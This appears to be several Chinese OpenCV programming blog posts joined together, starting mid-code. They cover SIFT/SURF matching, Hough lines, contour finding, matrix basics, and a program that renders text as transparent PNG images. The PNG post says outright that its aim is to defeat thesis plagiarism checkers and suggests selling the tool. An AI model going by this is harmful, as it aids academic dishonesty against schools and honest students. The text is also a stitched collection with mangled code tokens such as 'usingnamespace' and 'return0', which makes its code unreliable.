        cout<<"opencv error"<<endl;
return -1;
    }
    cout<<"open right"<<endl;

//第一步，用SIFT算子检测关键点

    SiftFeatureDetector detector;//构造函数采用内部默认的
    std::vector<KeyPoint> keypoints_1,keypoints_2;//构造2个专门由点组成的点向量用来存储特征点

    detector.detect(img_1,keypoints_1);//将img_1图像中检测到的特征点存储起来放在keypoints_1中
    detector.detect(img_2,keypoints_2);//同理

//在图像中画出特征点
    Mat img_keypoints_1,img_keypoints_2;

    drawKeypoints(img_1,keypoints_1,img_keypoints_1,Scalar::all(-1),DrawMatchesFlags::DEFAULT);//在内存中画出特征点
    drawKeypoints(img_2,keypoints_2,img_keypoints_2,Scalar::all(-1),DrawMatchesFlags::DEFAULT);

    imshow("sift_keypoints_1",img_keypoints_1);//显示特征点
    imshow("sift_keypoints_2",img_keypoints_2);

//计算特征向量
    SiftDescriptorExtractor extractor;//定义描述子对象

    Mat descriptors_1,descriptors_2;//存放特征向量的矩阵

    extractor.compute(img_1,keypoints_1,descriptors_1);//计算特征向量
    extractor.compute(img_2,keypoints_2,descriptors_2);

//用burte force进行匹配特征向量
    BruteForceMatcher<L2<float>>matcher;//定义一个burte force matcher对象
    vector<DMatch>matches;
    matcher.match(descriptors_1,descriptors_2,matches);

//绘制匹配线段
    Mat img_matches;
    drawMatches(img_1,keypoints_1,img_2,keypoints_2,matches,img_matches);//将匹配出来的结果放入内存img_matches中

//显示匹配线段
    imshow("sift_Matches",img_matches);//显示的标题为Matches
    waitKey(0);
return0;
}

运行结果如下：



下面看surf算法函数的使用(和sift基本一样，就是函数名改了下而已)：
工程代码：

// surf_test.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <stdio.h>
#include <iostream>
#include "opencv2/core/core.hpp"//因为在属性中已经配置了opencv等目录，所以把其当成了本地目录一样
#include "opencv2/features2d/features2d.hpp"
#include "opencv2/highgui/highgui.hpp"

usingnamespace cv;
usingnamespace std;

void readme();

int main(int argc,char* argv[])
{
    Mat img_1=imread("./image/query.png",CV_LOAD_IMAGE_GRAYSCALE);//宏定义时CV_LOAD_IMAGE_GRAYSCALE=0，也就是读取灰度图像
    Mat img_2=imread("./image/rs_query.png",CV_LOAD_IMAGE_GRAYSCALE);//一定要记得这里路径的斜线方向，这与Matlab里面是相反的

if(!img_1.data || !img_2.data)//如果数据为空
    {
        cout<<"opencv error"<<endl;
return -1;
    }
    cout<<"open right"<<endl;

//第一步，用SURF算子检测关键点
int minHessian=400;

    SurfFeatureDetector detector(minHessian);
    std::vector<KeyPoint> keypoints_1,keypoints_2;//构造2个专门由点组成的点向量用来存储特征点

    detector.detect(img_1,keypoints_1);//将img_1图像中检测到的特征点存储起来放在keypoints_1中
    detector.detect(img_2,keypoints_2);//同理

//在图像中画出特征点
    Mat img_keypoints_1,img_keypoints_2;

    drawKeypoints(img_1,keypoints_1,img_keypoints_1,Scalar::all(-1),DrawMatchesFlags::DEFAULT);
    drawKeypoints(img_2,keypoints_2,img_keypoints_2,Scalar::all(-1),DrawMatchesFlags::DEFAULT);

    imshow("surf_keypoints_1",img_keypoints_1);
    imshow("surf_keypoints_2",img_keypoints_2);

//计算特征向量
    SurfDescriptorExtractor extractor;//定义描述子对象

    Mat descriptors_1,descriptors_2;//存放特征向量的矩阵

    extractor.compute(img_1,keypoints_1,descriptors_1);
    extractor.compute(img_2,keypoints_2,descriptors_2);

//用burte force进行匹配特征向量
    BruteForceMatcher<L2<float>>matcher;//定义一个burte force matcher对象
    vector<DMatch>matches;
    matcher.match(descriptors_1,descriptors_2,matches);

//绘制匹配线段
    Mat img_matches;
    drawMatches(img_1,keypoints_1,img_2,keypoints_2,matches,img_matches);//将匹配出来的结果放入内存img_matches中

//显示匹配线段
    imshow("surf_Matches",img_matches);//显示的标题为Matches
    waitKey(0);
return0;
}

其运行结果如下：



      从这个实验可以知道，在opencv中使用这2个算法是多么的简单！只需要简单的几个参数就可以达到很好的效果。但这只是opencv的低级应用，我们应该在最好能用opencv一些内部函数来帮助实现自己的算法和想法。这就是分析opencv源码的主要目的。
 
 
 
     另外，从实验的过程中可以感觉出来surf算法的运行时间比sift快很多，且特征点的数目检测得比较多，其它的暂时还没区别出来。欢迎交流，谢谢！
作者：tornadomeet 出处：http://www.cnblogs.com/tornadomeet 欢迎转载或分享，但请务必声明文章出处。 （新浪微博：tornadomeet,欢迎交流！）






     
        今天听说很多同志们写毕业论文重复率过高的问题，大牛说用图片代替字就行了，我就想用OpenCV实现一下看看能不能搞，果不其然还是可以的!!!主要的难点在于普通格式的图片背景不透明，需要使用背景透明的png格式图片就行。
 
主要思想和步骤：
 
1.首先配置好FreeType与OpenCV，添加编译好的lib，与include目录和CvxText.h和CvxText.cpp就行了，参考[1]
 
2.说一下思路，主要就是OpenCV版本的问题造成有的函数用的IplImage，而函数
//设置原图像文字
 text.putText(ImageSrc, msg, cvPoint(1, size_zi), color);
只能接受IplImage格式的参数，所以保存成png，就比较麻烦了。
 
png格式的图片是4个通道，按照BGRA来放置，alaph就是透明通道。我们的思路就是按照原来直接给图片上叠加文字的办法，新建与文字大小相同的图片，然后二值化，按照二值模版生成新的png文字图片，有字的地方添上颜色，没字的地方设置为透明。
 
当然二值化算法网上搜了一个自适应阀值的算法效果非常好：参考[3]
 
 
 
3.生成了透明的文字图片，粘贴到论文里面，估计查询重复的系统再牛逼也是无能为力了。后序有空做一些程序界面跟字符分割的东西，可以直接卖钱了。
当然，字体跟大小，上下边距都是可以设置的，后序再往程序里面写。
 
 
 
 
 
实现效果：
 

 

 
 

 
 
 
主要代码：
// AddChinese.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"



#include <opencv2/core/core.hpp>  
#include <opencv2/highgui/highgui.hpp>
#include "CvxText.h"

#pragma comment(lib,"freetype255d.lib")
#pragma comment(lib,"opencv_core2410d.lib")                
#pragma comment(lib,"opencv_highgui2410d.lib")                
#pragma comment(lib,"opencv_imgproc2410d.lib")   

using namespace std;
using namespace cv;

#define ROW_BLOCK 2
#define COLUMN_Block 2

// writePng.cpp : 定义控制台应用程序的入口点。
//





int run_test_png(Mat &mat,string image_name)
{


	/*采用自己设置的参数来保存图片*/
	//Mat mat(480, 640, CV_8UC4);
	//createAlphaMat(mat);
	vector<int> compression_params;
	compression_params.push_back(CV_IMWRITE_PNG_COMPRESSION);
	compression_params.push_back(9);    //png格式下，默认的参数为3.
	try 
	{
		imwrite(image_name, mat, compression_params);
	}
	catch (runtime_error& ex) 
	{
		fprintf(stderr, "Exception converting image to PNG format: %s\n", ex.what());
		return 1;
	}
	fprintf(stdout, "Saved PNG file with alpha data.\n");

	waitKey(0);
	return 0;
}

int coloured(Mat &template_src, Mat &mat_png, CvScalar color)
{

	for (int i = 0; i < template_src.rows; ++i) 
	{
		for (int j = 0; j < template_src.cols; ++j) 
		{
			Vec4b& bgra = mat_png.at<Vec4b>(i, j);
			//int temp = template_src.at<uchar>(i,j);
			if (template_src.at<uchar>(i,j)== 0)
			{
				bgra[0] = color.val[0];    //b通道
				bgra[1] = color.val[1];		//g通道
				bgra[2] = color.val[2];		//r通道
				bgra[3] = 255;//alpha通道全部设置为透明完全透明为0，否则为255
			}
			else
			{
				bgra[3] = 0;//alpha通道全部设置为透明完全透明为0，否则为255
			}
			
			
			
		}
	}

	return 0;
}

void ImageBinarization(IplImage *src)
{	/*对灰度图像二值化，自适应门限threshold*/
	int i,j,width,height,step,chanel,threshold;
	/*size是图像尺寸，svg是灰度直方图均值，va是方差*/
	float size,avg,va,maxVa,p,a,s;
	unsigned char *dataSrc;
	float histogram[256];

	width = src->width;
	height = src->height;
	dataSrc = (unsigned char *)src->imageData;
	step = src->widthStep/sizeof(char);
	chanel = src->nChannels;
	/*计算直方图并归一化histogram*/
	for(i=0; i<256; i++)
		histogram[i] = 0;
	for(i=0; i<height; i++)
		for(j=0; j<width*chanel; j++)
		{
			histogram[dataSrc[i*step+j]-'0'+48]++;
		}
		size = width * height;
		for(i=0; i<256; i++)
			histogram[i] /=size;
		/*计算灰度直方图中值和方差*/
		avg = 0;
		for(i=0; i<256; i++)
			avg += i*histogram[i];
		va = 0;
		for(i=0; i<256; i++)
			va += fabs(i*i*histogram[i]-avg*avg);
		/*利用加权最大方差求门限*/
		threshold = 20;
		maxVa = 0;
		p = a = s = 0;
		for(i=0; i<256; i++)
		{
			p += histogram[i];
			a += i*histogram[i];
			s = (avg*p-a)*(avg*p-a)/p/(1-p);
			if(s > maxVa)
			{
				threshold = i;
				maxVa = s;
			}
		}
		/*二值化*/
		for(i=0; i<height; i++)
			for(j=0; j<width*chanel; j++)
			{
				if(dataSrc[i*step+j] > threshold)
					dataSrc[i*step+j] = 255;
				else
					dataSrc[i*step+j] = 0;
			}
}

Mat binaryzation(Mat &src)
{
	Mat des_gray(src.size(),CV_8UC1);

	cvtColor(src,des_gray,CV_BGR2GRAY);
	
	//Mat bin_mat();
	IplImage temp(des_gray);
	ImageBinarization(&temp);


	//threshold(des_gray,des_gray,150,255,THRESH_BINARY);
	imshow("二值图像",des_gray);
	return des_gray;
}

int generate_chinese(const int size_zi, const char *msg ,int number,CvScalar color)
{
	//int size_zi = 50;//字体大小
	CvSize czSize;  //目标图像尺寸
	float p = 0.5;
	CvScalar fsize;


	//读取TTF字体文件
	CvxText text("simhei.ttf");     

	//设置字体属性 字体大小/空白比例/间隔比例/旋转角度
	fsize = cvScalar(size_zi, 1, 0.1, 0);
	text.setFont(NULL, &fsize, NULL, &p);      

	czSize.width = size_zi*number;
	czSize.height = size_zi;
	//加载原图像
	IplImage* ImageSrc = cvCreateImage(czSize,IPL_DEPTH_8U,3);//cvLoadImage(Imagename, CV_LOAD_IMAGE_UNCHANGED);
	//Mat image(ImageSrc);
	//createAlphaMat(image);
	//ImageSrc = ℑ

	//IplImage temp(image); 
	//ImageSrc = &temp;

	//设置原图像文字
	text.putText(ImageSrc, msg, cvPoint(1, size_zi), color); 

	//显示原图像
	cvShowImage("原图", ImageSrc);


	string hanzi = msg;
	hanzi = hanzi + ".png";

	Mat chinese(ImageSrc,true);
	Mat gray = binaryzation(chinese);

	imwrite("chinese_gray.jpg",gray);

	Mat mat_png(chinese.size(),CV_8UC4);
	coloured(gray,mat_png,color);
	run_test_png(mat_png,hanzi);
	//
	////cvSaveImage("hanzi.jpg",reDstImage);
	//run_test_png(chinese,hanzi);
	//等待按键事件
	cvWaitKey();
	return 0;
}

int main()
{
	CvScalar color = CV_RGB(0,0,0);
	int size = 200;
	const char* msg = "你好a";//暂时一行字不要太长

	int number = 3;//字符个数

	generate_chinese(size,msg,number,color);
	

	return 0;
}



 
完整工程下载：
http://download.csdn.net/detail/wangyaninglm/8486521
 
参考文献：
 
http://blog.csdn.net/fengbingchun/article/details/8029337
http://www.oschina.net/code/snippet_1447359_36028
http://blog.csdn.net/hustspy1990/article/details/6301592






 
 
 

 
 
 
/*------------------------------------------------------------------------------------------*\
   This file contains material supporting chapter 7 of the cookbook:  
   Computer Vision Programming using the OpenCV Library. 
   by Robert Laganiere, Packt Publishing, 2011.

   This program is free software; permission is hereby granted to use, copy, modify, 
   and distribute this source code, or portions thereof, for any purpose, without fee, 
   subject to the restriction that the copyright notice may not be removed 
   or altered from any source or altered source distribution. 
   The software is released on an as-is basis and without any warranties of any kind. 
   In particular, the software is not guaranteed to be fault-tolerant or free from failure. 
   The author disclaims all warranties with regard to this software, any use, 
   and any consequent failure, is purely the responsibility of the user.
 
   Copyright (C) 2010-2011 Robert Laganiere, www.laganiere.name
\*------------------------------------------------------------------------------------------*/

#if !defined LINEF
#define LINEF

#include <opencv2/core/core.hpp>
#include <opencv2/imgproc/imgproc.hpp>
#define PI 3.1415926

class LineFinder {

  private:

	  // original image
	  cv::Mat img;

	  // vector containing the end points 
	  // of the detected lines
	  std::vector<cv::Vec4i> lines;

	  // accumulator resolution parameters
	  double deltaRho;
	  double deltaTheta;

	  // minimum number of votes that a line 
	  // must receive before being considered
	  int minVote;

	  // min length for a line
	  double minLength;

	  // max allowed gap along the line
	  double maxGap;

  public:

	  // Default accumulator resolution is 1 pixel by 1 degree
	  // no gap, no mimimum length
	  LineFinder() : deltaRho(1), deltaTheta(PI/180), minVote(10), minLength(0.), maxGap(0.) {}

	  // Set the resolution of the accumulator
	  void setAccResolution(double dRho, double dTheta) 
	  {

		  deltaRho= dRho;
		  deltaTheta= dTheta;
	  }

	  // Set the minimum number of votes
	  void setMinVote(int minv)
	  {

		  minVote= minv;
	  }

	  // Set line length and gap
	  void setLineLengthAndGap(double length, double gap) 
	  {

		  minLength= length;
		  maxGap= gap;
	  }

	  // Apply probabilistic Hough Transform
	  std::vector<cv::Vec4i> findLines(cv::Mat& binary) 
	  {

		  lines.clear();
		  cv::HoughLinesP(binary,lines,deltaRho,deltaTheta,minVote, minLength, maxGap);

		  return lines;
	  }

	  // Draw the detected lines on an image
	  void drawDetectedLines(cv::Mat &image, cv::Scalar color=cv::Scalar(255,255,255))
	  {
	
		  // Draw the lines
		  std::vector<cv::Vec4i>::const_iterator it2= lines.begin();
	
		  while (it2!=lines.end()) {
		
			  cv::Point pt1((*it2)[0],(*it2)[1]);        
			  cv::Point pt2((*it2)[2],(*it2)[3]);

			  cv::line( image, pt1, pt2, color);
		
			  ++it2;	
		  }
	  }

	  // Eliminates lines that do not have an orientation equals to
	  // the ones specified in the input matrix of orientations
	  // At least the given percentage of pixels on the line must 
	  // be within plus or minus delta of the corresponding orientation
	  std::vector<cv::Vec4i> removeLinesOfInconsistentOrientations(
		  const cv::Mat &orientations, double percentage, double delta) 
	  {

			  std::vector<cv::Vec4i>::iterator it= lines.begin();
	
			  // check all lines
			  while (it!=lines.end()) {

				  // end points
				  int x1= (*it)[0];
				  int y1= (*it)[1];
				  int x2= (*it)[2];
				  int y2= (*it)[3];
		   
				  // line orientation + 90o to get the parallel line
				  double ori1= atan2(static_cast<double>(y1-y2),static_cast<double>(x1-x2))+PI/2;
				  if (ori1>PI) ori1= ori1-2*PI;

				  double ori2= atan2(static_cast<double>(y2-y1),static_cast<double>(x2-x1))+PI/2;
				  if (ori2>PI) ori2= ori2-2*PI;
	
				  // for all points on the line
				  cv::LineIterator lit(orientations,cv::Point(x1,y1),cv::Point(x2,y2));
				  int i,count=0;
				  for(i = 0, count=0; i < lit.count; i++, ++lit) { 
		
					  float ori= *(reinterpret_cast<float *>(*lit));

					  // is line orientation similar to gradient orientation ?
					  if (std::min(fabs(ori-ori1),fabs(ori-ori2))<delta)
						  count++;
		
				  }

				  double consistency= count/static_cast<double>(i);

				  // set to zero lines of inconsistent orientation
				  if (consistency < percentage) {
 
					  (*it)[0]=(*it)[1]=(*it)[2]=(*it)[3]=0;

				  }

				  ++it;
			  }

			  return lines;
	  }
};


#endif


 
 
// HoughLines.cpp : 定义控制台应用程序的入口点。
//

// findContours.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"


/*------------------------------------------------------------------------------------------*\
   This file contains material supporting chapter 7 of the cookbook:  
   Computer Vision Programming using the OpenCV Library. 
   by Robert Laganiere, Packt Publishing, 2011.

   This program is free software; permission is hereby granted to use, copy, modify, 
   and distribute this source code, or portions thereof, for any purpose, without fee, 
   subject to the restriction that the copyright notice may not be removed 
   or altered from any source or altered source distribution. 
   The software is released on an as-is basis and without any warranties of any kind. 
   In particular, the software is not guaranteed to be fault-tolerant or free from failure. 
   The author disclaims all warranties with regard to this software, any use, 
   and any consequent failure, is purely the responsibility of the user.
 
   Copyright (C) 2010-2011 Robert Laganiere, www.laganiere.name
\*------------------------------------------------------------------------------------------*/

#include <iostream>
#include <vector>
#include <opencv2/core/core.hpp>
#include <opencv2/imgproc/imgproc.hpp>
#include <opencv2/highgui/highgui.hpp>

#include "HoughLines.h"

#pragma comment(lib,"opencv_core2410d.lib")
#pragma comment(lib,"opencv_highgui2410d.lib")
#pragma comment(lib,"opencv_imgproc2410d.lib")


#define PI 3.1415926

int main()
{
	// Read input image
	cv::Mat image= cv::imread("road.jpg",0);
	if (!image.data)
		return 0; 

	// Display the image
	cv::namedWindow("Original Image");
	cv::imshow("Original Image",image);


	

	// Apply Canny algorithm
	cv::Mat contours;
	cv::Canny(image,contours,125,350);
	cv::Mat contoursInv;
	cv::threshold(contours,contoursInv,128,255,cv::THRESH_BINARY_INV);

	// Display the image of contours
	cv::namedWindow("Canny Contours");
	cv::imshow("Canny Contours",contoursInv);




	// Hough tranform for line detection
	std::vector<cv::Vec2f> lines;
	cv::HoughLines(contours,lines,1,PI/180,60);

	// Draw the lines
	cv::Mat result(contours.rows,contours.cols,CV_8U,cv::Scalar(255));
	image.copyTo(result);

	std::cout << "Lines detected: " << lines.size() << std::endl;

	std::vector<cv::Vec2f>::const_iterator it= lines.begin();
	while (it!=lines.end()) 
	{


		float rho= (*it)[0];   // first element is distance rho
		float theta= (*it)[1]; // second element is angle theta

		if (theta < PI/4. || theta > 3.*PI/4.) { // ~vertical line

			// point of intersection of the line with first row
			cv::Point pt1(rho/cos(theta),0);        
			// point of intersection of the line with last row
			cv::Point pt2((rho-result.rows*sin(theta))/cos(theta),result.rows);
			// draw a white line
			cv::line( result, pt1, pt2, cv::Scalar(255), 1); 

		} else { // ~horizontal line

			// point of intersection of the line with first column
			cv::Point pt1(0,rho/sin(theta));        
			// point of intersection of the line with last column
			cv::Point pt2(result.cols,(rho-result.cols*cos(theta))/sin(theta));
			// draw a white line
			cv::line( result, pt1, pt2, cv::Scalar(255), 1); 
		}

		std::cout << "line: (" << rho << "," << theta << ")\n"; 

		++it;
	}

	// Display the detected line image
	cv::namedWindow("Detected Lines with Hough");
	cv::imshow("Detected Lines with Hough",result);

	// Create LineFinder instance
	LineFinder ld;

	// Set probabilistic Hough parameters
	ld.setLineLengthAndGap(100,20);
	ld.setMinVote(80);

	// Detect lines
	std::vector<cv::Vec4i> li= ld.findLines(contours);
	ld.drawDetectedLines(image);
	cv::namedWindow("Detected Lines with HoughP");
	cv::imshow("Detected Lines with HoughP",image);

	
	cv::waitKey();
	return 0;
}

 
实现效果：
 
 







 
 

转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/44151213，

来自：shiter编写程序的艺术

基础介绍
OpenCV里提取目标轮廓的函数是findContours，它的输入图像是一幅二值图像，输出的是每一个连通区域的轮廓点的集合：vector<vector<Point>>。外层vector的size代表了图像中轮廓的个数，里面vector的size代表了轮廓上点的个数。


轮廓进行填充的时候我会有下面2步骤：

a）依次遍历轮廓点，将点绘制到img上


    void drawMaxAreaLine(cv::Mat &dst, const std::vector<cv::Point> maxAreaPoints)
    {
        int step = dst.step;
        auto data = dst.data;
        for (int i = 0; i < maxAreaPoints.size(); ++i)
        {
            *(data + maxAreaPoints[i].x + maxAreaPoints[i].y * step) = 255;
        }
    }



b）使用floodFill以及一个种子点进行填充

    floodFill(savedGrayMat, Point(currentFrameEdge[0].x + 2, currentFrameEdge[0].y + 2), 255);

主要函数用法


C++: void findContours(InputOutputArray image,
 OutputArrayOfArrays contours, int mode, int method, Point offset=Point())
Python: cv2.findContours(image,
 mode, method[, contours[, hierarchy[, offset]]]) →
 contours, hierarchy

C: int cvFindContours(CvArr* image,
 CvMemStorage* storage, CvSeq** first_contour, int header_size=sizeof(CvContour), int mode=CV_RETR_LIST, intmethod=CV_CHAIN_APPROX_SIMPLE, CvPoint offset=cvPoint(0,0) )
Python: cv.FindContours(image,
 storage, mode=CV_RETR_LIST, method=CV_CHAIN_APPROX_SIMPLE, offset=(0, 0)) → contours
Parameters:

image – Source, an 8-bit single-channel image. Non-zero pixels are treated as 1’s. Zero pixels remain 0’s, so the image is treated asbinary .
 You can use compare() , inRange() , threshold() , adaptiveThreshold() , Canny() ,
 and others to create a binary image out of a grayscale or color one. The function modifies the image while extracting the contours. If mode
 equals to CV_RETR_CCOMP orCV_RETR_FLOODFILL,
 the input can also be a 32-bit integer image of labels (CV_32SC1).contours – Detected contours. Each contour is stored as a vector of points.hierarchy – Optional output vector, containing information about the image topology. It has as many elements as the number of contours. For each i-th contour contours[i] ,
 the elements hierarchy[i][0] , hiearchy[i][1] , hiearchy[i][2] ,
 and hiearchy[i][3] are set to 0-based indices in contours of
 the next and previous contours at the same hierarchical level, the first child contour and the parent contour, respectively. If for the contour i there
 are no next, previous, parent, or nested contours, the corresponding elements of hierarchy[i]will be negative.mode –
Contour retrieval mode (if you use Python see also a note below).
CV_RETR_EXTERNAL retrieves only the extreme outer contours. It sets hierarchy[i][2]=hierarchy[i][3]=-1 for
 all the contours.CV_RETR_LIST retrieves all of the contours without establishing any hierarchical relationships.CV_RETR_CCOMP retrieves all of the contours and organizes them into a two-level hierarchy. At the top level, there are external boundaries of the components. At the second level,
 there are boundaries of the holes. If there is another contour inside a hole of a connected component, it is still put at the top level.CV_RETR_TREE retrieves all of the contours and reconstructs a full hierarchy of nested contours. This full hierarchy is built and shown in the OpenCV contours.c demo.method –
Contour approximation method (if you use Python see also a note below).
CV_CHAIN_APPROX_NONE stores absolutely all the contour points. That is, any 2 subsequent points (x1,y1) and (x2,y2) of
 the contour will be either horizontal, vertical or diagonal neighbors, that is, max(abs(x1-x2),abs(y2-y1))==1.CV_CHAIN_APPROX_SIMPLE compresses horizontal, vertical, and diagonal segments and leaves only their end points. For example, an up-right rectangular contour is encoded with 4 points.CV_CHAIN_APPROX_TC89_L1,CV_CHAIN_APPROX_TC89_KCOS applies one of the flavors of the Teh-Chin chain approximation algorithm. See[TehChin89] for
 details.offset – Optional offset by which every contour point is shifted. This is useful if the contours are extracted from the image ROI and then they should be analyzed in the whole image
 context.

cvFindContours(tour_buf,storage, &contour,sizeof(CvContour), CV_RETR_EXTERNAL, CV_CHAIN_APPROX_SIMPLE);   
       tour_buf 是需要查找轮廓的单通道灰度图像 ，       storage 是临时存储区 ，          contour是存储轮廓点的CvSeq实例，          CV_RECT_EXTERNAL 只查找外围轮廓，还有CV_RECT_TREE    


输入图像image必须为一个2值单通道图像
contours参数为检测的轮廓数组，每一个轮廓用一个point类型的vector表示
hiararchy参数和轮廓个数相同，每个轮廓contours[ i ]对应4个hierarchy元素hierarchy[ i ][ 0 ] ~hierarchy[ i ][ 3 ]，分别表示后一个轮廓、前一个轮廓、父轮廓、内嵌轮廓的索引编号，如果没有对应项，该值设置为负数。
mode表示轮廓的检索模式

CV_RETR_EXTERNAL表示只检测外轮廓
CV_RETR_LIST检测的轮廓不建立等级关系
CV_RETR_CCOMP建立两个等级的轮廓，上面的一层为外边界，里面的一层为内孔的边界信息。如果内孔内还有一个连通物体，这个物体的边界也在顶层。
CV_RETR_TREE建立一个等级树结构的轮廓。具体参考contours.c这个demo

method为轮廓的近似办法

CV_CHAIN_APPROX_NONE存储所有的轮廓点，相邻的两个点的像素位置差不超过1，即max（abs（x1-x2），abs（y2-y1））==1
CV_CHAIN_APPROX_SIMPLE压缩水平方向，垂直方向，对角线方向的元素，只保留该方向的终点坐标，例如一个矩形轮廓只需4个点来保存轮廓信息
CV_CHAIN_APPROX_TC89_L1，CV_CHAIN_APPROX_TC89_KCOS使用teh-Chinl chain 近似算法

         正确调用查找函数后，接下来就是从轮廓序列contour（这里的contour不单单只有一个轮廓序列) 提取轮廓点了.     contour可能是空指针，提取前最好判断一下   在提取之前还可以调用一个函数：            contour = cvApproxPoly( contour, sizeof(CvContour), storage, CV_POLY_APPROX_DP, 3, 1 );            可能是拟合，有这一句找出的轮廓线更直。   contour里面包含了很多个轮廓，每个轮廓是单独存放的.  

 
#include "cv.h"
#include <iostream>
#include <cxcore.h>
#include <highgui.h>
#include <math.h> 
#include <vector>
#include <algorithm>

#pragma comment(lib,"opencv_core2410d.lib")    
#pragma comment(lib,"opencv_highgui2410d.lib")    
#pragma comment(lib,"opencv_imgproc2410d.lib") 


using namespace std; 

typedef struct
{
	CvPoint cP;
	int height;
	int width;

} RecP;
//自定义排序函数
namespace my
{
bool less(const RecP& s1, const RecP& s2)
{
	//if(s1.cP.x < s2.cP.x && s1.cP.y < s2.cP.y)
	return s1.cP.x < s2.cP.x;          //依次增大

} 
}

void PrintVector( vector<RecP> & vec)  
{    
	for(vector<RecP>::iterator n = vec.begin() ; n != vec.end() ; n++ )  
	{  
		cout<< n->cP.x <<'\t'<< n->cP.y <<'\t'<< n->height<<'\t'<< n->width <<endl;  
	}  
}  

IplImage* src; 
IplImage* img; 
IplImage* dst; 
IplImage* bianyuan;
CvMemStorage* storage=NULL;

int thresh=50;

void on_trackbar(int pos)
{         
	CvSeq* contour=0;
	if(storage==NULL)
	{
		dst=cvCreateImage(cvGetSize(bianyuan), 8, 3); 
		storage=cvCreateMemStorage(0); 
	}
	else 
	{
		cvClearMemStorage(storage); 
	} 
	cvSmooth(bianyuan, bianyuan, CV_GAUSSIAN, 3, 3, 0, 0);
	cvThreshold( bianyuan, img, thresh, 200, CV_THRESH_BINARY);

	cvNamedWindow( "threshold", 1);
	cvShowImage( "threshold", img );

	cvFindContours(img, storage, &contour, sizeof(CvContour), CV_RETR_CCOMP, CV_CHAIN_APPROX_NONE, cvPoint(0,0));  //查找轮廓
	cvZero( dst );     //将数组中所有通道的所有元素的值都设置为0

	vector<RecP> vecP;

	int n=0;
	for( ; contour; contour = contour->h_next )                                                           
	{
		CvRect rect=cvBoundingRect(contour,1);       // 获取矩形边界框 

		if(abs(rect.width-rect.height)>3)
		{
			rect.width=0;
			rect.height=0;
			rect.x = rect.x + 640;
			rect.y = rect.y + 480;
		}


		CvPoint pt1=cvPoint(rect.x, rect.y), pt2=cvPoint(rect.x+rect.width, rect.y+rect.height);   //定义矩形对顶点

		cvRectangle(dst, pt1, pt2, CV_RGB(255,0,0), 1, CV_AA, 0);      //绘制矩形边框
		cvLine(dst, pt1, pt2, CV_RGB(0,255,0), 1, CV_AA, 0);           //矩形对角线相连

		pt1=cvPoint(rect.x, rect.y+rect.height),
			pt2=cvPoint(rect.x+rect.width, rect.y);

		cvLine(dst, pt1, pt2, CV_RGB(0,255,0), 1, CV_AA,0);            //矩形对角线相连

		RecP tmp;
		CvPoint p1;
		p1 = cvPoint(rect.x + rect.width/2, rect.y + rect.height/2);   //矩形中心坐标

		tmp.cP = p1;
		tmp.height = rect.height;
		tmp.width = rect.width;
		vecP.push_back(tmp);
		//printf("(%d,%d)\n", p1);
		sort(vecP.begin(), vecP.end(),my::less);    //依次增大
		//printf("(%d,%d):(%d,%d)\n", vecP[n].cP, vecP[n].height, vecP[n].width);
		n++;
	} 
	PrintVector(vecP);

	cvShowImage( "Components", dst ); 
}                                                                                                           
int main()                                                                           
{                                                                                                             

	const char* a = "Chess.jpg";
	src = cvLoadImage(a, 0);
	cvSmooth(src,src,CV_GAUSSIAN,5,5,0,0);
	cvNamedWindow( "Source0000",1);                                                                               
	cvShowImage( "Source0000", src);  

	IplImage* bw =NULL;
	IplImage* color=NULL;
	IplImage* jh=NULL;
	IplImage* sm=NULL;
	if( !src )
		return -1;
	jh = cvCreateImage( cvGetSize(src), 8, 1 );
	sm = cvCreateImage( cvGetSize(src), 8, 1 );
	bw = cvCreateImage( cvGetSize(src), 8, 1 );
	color = cvCreateImage( cvGetSize(src), 8, 3 );
	cvEqualizeHist( src, jh);
	cvSmooth(jh, sm, CV_MEDIAN, 3, 3, 0, 0);

	cvCanny(sm,bw,200,600,3);
	cvCvtColor( bw, color, CV_GRAY2BGR );
	cvSaveImage("color.bmp",color);

	const char* b = "color.bmp";
	bianyuan = cvLoadImage(b, 0);
	img=cvCreateImage(cvGetSize(bianyuan),8,1); 

	cvNamedWindow( "Source",1);                                                                               
	cvShowImage( "Source", bianyuan);  

	cvNamedWindow( "Components",1);                                                                           

	on_trackbar(0);

	cvWaitKey(0);                                                                                             
	cvDestroyWindow( "sorce" );                                                                               
	cvDestroyWindow( "threshold" );                                                                           
	cvDestroyWindow( "Components" );                                                                          
	cvReleaseImage( &src);                                                                                    
	cvReleaseImage( &img );                                                                                   
	cvReleaseImage(&dst);                                                                                     
	cvReleaseMemStorage(&storage); 
	return 0;
}


 
 
 
 实现效果
 


参考文献
http://blog.csdn.net/zcube/article/details/7357602# 轮廓分析



转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/44151213，

来自：shiter编写程序的艺术
 





矩阵处理
1、矩阵的内存分配与释放
（1） 总体上:
 OpenCV 使用C语言来进行矩阵操作。不过实际上有很多C++语言的替代方案可以更高效地完成。
 在OpenCV中向量被当做是有一个维数为1的N维矩阵.
 矩阵按行-行方式存储，每行以4字节（32位）对齐.
（2） 为新矩阵分配内存:

CvMat* cvCreateMat(int rows, int cols, int type);
type: 矩阵元素类型.
按CV_<bit_depth>(S|U|F)C<number_of_channels> 方式指定. 例如: CV_8UC1 、CV_32SC2.
示例:
CvMat* M = cvCreateMat(4,4,CV_32FC1);

（3） 释放矩阵内存:

CvMat* M = cvCreateMat(4,4,CV_32FC1);
cvReleaseMat(&M);

（4） 复制矩阵:

CvMat* M1 = cvCreateMat(4,4,CV_32FC1);
CvMat* M2;
M2=cvCloneMat(M1);

（5） 初始化矩阵:

double a[] = { 1, 2, 3, 4,
 5, 6, 7, 8,
 9, 10, 11, 12 };
CvMat Ma=cvMat(3, 4, CV_64FC1, a);

//等价于:
CvMat Ma;
cvInitMatHeader(&Ma, 3, 4, CV_64FC1, a);

（6） 初始化矩阵为单位矩阵:

CvMat* M = cvCreateMat(4,4,CV_32FC1);
cvSetIdentity(M); // does not seem to be working properl

2、访问矩阵元素
（1） 假设需要访问一个2D浮点型矩阵的第（i, j）个单元.
（2） 间接访问:

cvmSet(M,i,j,2.0); // Set M(i,j)
t = cvmGet(M,i,j); // Get M(i,j)


（3） 直接访问（假设矩阵数据按4字节行对齐）:

CvMat* M = cvCreateMat(4,4,CV_32FC1);
int n = M->cols;
float *data = M->data.fl;
data[i*n+j] = 3.0;


